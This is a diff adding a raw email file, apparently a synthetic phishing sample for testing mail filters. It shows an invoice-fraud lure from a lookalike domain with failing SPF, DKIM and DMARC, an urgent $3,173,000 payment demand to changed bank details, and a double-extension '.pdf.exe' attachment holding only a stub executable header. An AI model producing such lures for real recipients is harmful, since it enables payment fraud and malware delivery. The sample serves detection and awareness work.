@@ -1,0 +1,74 @@
+From: "Lakeside Consulting Accounts" <billing@Iinkedin-jobs.xyz>
+To: Ishita Reddy <ishita.reddy@kalyaniworks.in>
+Subject: Purchase order INV-2026-0203 needs your approval
+Date: Thu, 21 May 2026 04:23:00 +0000
+Message-ID: <178772093913.6.3207691719465507466@Iinkedin-jobs.xyz>
+Return-Path: <bounce-2920@Iinkedin-jobs.xyz>
+MIME-Version: 1.0
+Received: from smtp-out-3.example (smtp-out-3.example [192.0.2.44]) by
+ mx.kalyaniworks.in (Postfix) with ESMTPS id 787A40308EE6 for
+ <recipient@kalyaniworks.in>; Thu, 21 May 2026 04:23:00 +0000
+Received: from vps-31.hosting.example (vps-31.hosting.example [198.51.100.7])
+ by smtp-out-3.example (Postfix) with ESMTPS id 3AFCA79CD8C4; Thu, 21 May 2026
+ 04:19:15 +0000
+Received: from edge-2.mailcluster.example (edge-2.mailcluster.example
+ [203.0.113.61]) by vps-31.hosting.example (Postfix) with ESMTPS id
+ 59527FA74C7E; Thu, 21 May 2026 04:15:21 +0000
+Received-SPF: softfail (mailfrom) identity=mailfrom; client-ip=192.0.2.201;
+ envelope-from=<bounce@Iinkedin-jobs.xyz>;
+Authentication-Results: mx.Iinkedin-jobs.xyz; spf=softfail
+ smtp.mailfrom=Iinkedin-jobs.xyz; dkim=fail header.d=Iinkedin-jobs.xyz;
+ dmarc=fail (p=reject) header.from=Iinkedin-jobs.xyz
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=Iinkedin-jobs.xyz;
+ s=selector1; t=446107299; h=from:to:subject:date;
+ bh=R/aWURT4xYsGLCYdVVDRy2pHWPMtIfjnGW2Bih3O3Xo=; =?utf-8?q?b=3DMbbU2LJvuWJL?=
+ =?utf-8?q?DKM+FZ8zmMtidT6ELMXhM9dkSgUYGQWtlhvn+4efTzDRvE2Xfgeh1oDwpDAm8awRr?=
+ =?utf-8?q?AnJCHAJGA=3D=3D?=
+Content-Type: multipart/mixed; boundary="===============5850408920327932729=="
+
+--===============5850408920327932729==
+Content-Type: multipart/alternative;
+ boundary="===============6364809313893104761=="
+
+--===============6364809313893104761==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Hello Ishita,
+
+Please find attached invoice INV-2026-0203 for $3,173,000, now overdue. Kindly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Divya Carter
+Accounts Receivable, Lakeside Consulting
+
+--===============6364809313893104761==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Ishita,</p><p>Please find attached invoice INV-2026-0203=
+ for $3,173,000, now overdue. Kindly review the attached statement and proces=
+s this payment immediately to avoid service interruption.</p><p>If the bank d=
+etails have changed since your last remittance, use the updated account infor=
+mation in the attachment.</p><p>Regards, Divya Carter Accounts Receivable, La=
+keside Consulting</p></body></html>
+
+--===============6364809313893104761==--
+
+--===============5850408920327932729==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-2026-0203.pdf.exe"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============5850408920327932729==--
